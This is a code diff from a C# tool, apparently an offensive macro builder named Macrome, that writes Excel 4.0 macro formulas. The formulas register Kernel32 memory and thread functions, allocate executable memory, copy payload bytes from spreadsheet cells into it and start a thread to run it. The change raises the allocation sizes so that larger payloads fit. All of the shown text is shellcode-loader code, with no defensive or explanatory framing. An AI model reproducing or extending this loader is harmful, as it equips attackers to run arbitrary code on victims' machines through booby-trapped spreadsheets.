@@ -287,7 +287,7 @@ namespace Macrome
                 "=REGISTER(\"Kernel32\",\"VirtualAlloc\",\"JJJJJ\",\"VA\",,1,0)",
                 "=REGISTER(\"Kernel32\",\"CreateThread\",\"JJJJJJJ\",\"CT\",,1,0)",
                 "=REGISTER(\"Kernel32\",\"WriteProcessMemory\",\"JJJCJJ\",\"WPM\",,1,0)",
-                "=VA(0,1000000,4096,64)", //Referenced by baseMemoryAddress
+                "=VA(0,10000000,4096,64)", //Referenced by baseMemoryAddress
                 string.Format("=SET.VALUE({0}!{1}, 0)", macroSheetName, lengthCounter),
                 string.Format("=SET.VALUE({0}!{1},1)", macroSheetName, offsetCounter),
                 string.Format("=FORMULA(\"={0}!R\"&{0}!{1}&\"{2}\",{0}!{3})", macroSheetName, offsetCounter, dataCol, dataCellRef),
@@ -344,7 +344,7 @@ namespace Macrome
                 "=REGISTER(\"Kernel32\",\"WriteProcessMemory\",\"JJJCJJ\",\"WProcessMemory\",,1,9)",
                 "=REGISTER(\"Kernel32\",\"CreateThread\",\"JJJJJJJ\",\"CThread\",,1,9)",
                 string.Format("=IF(ISNUMBER(SEARCH(\"32\",GET.WORKSPACE(1))),GOTO({0}),GOTO({1}))",x86CellStart, x64CellStart),
-                "=Valloc(0,65536,4096,64)",
+                "=Valloc(0,10000000,4096,64)",
                 string.Format("{0}={1}", variableName, x86PayloadCellStart),
                 string.Format("=SET.VALUE({0},0)", rowsWrittenCell),
                 string.Format("=WHILE({0}<>\"END\")", variableName),
@@ -358,7 +358,7 @@ namespace Macrome
                 "1342439424", //Base memory address to brute force a page
                 "0",
                 string.Format("=WHILE({0}=0)", x64AllocatedMemoryBase),
-                string.Format("=SET.VALUE({0},Valloc({1},65536,12288,64))", x64AllocatedMemoryBase, x64CellStart),
+                string.Format("=SET.VALUE({0},Valloc({1},10000000,12288,64))", x64AllocatedMemoryBase, x64CellStart),
                 string.Format("=SET.VALUE({0},{0}+262144)", x64CellStart),
                 "=NEXT()",
                 "=REGISTER(\"Kernel32\",\"RtlCopyMemory\",\"JJCJ\",\"RTL\",,1,9)",
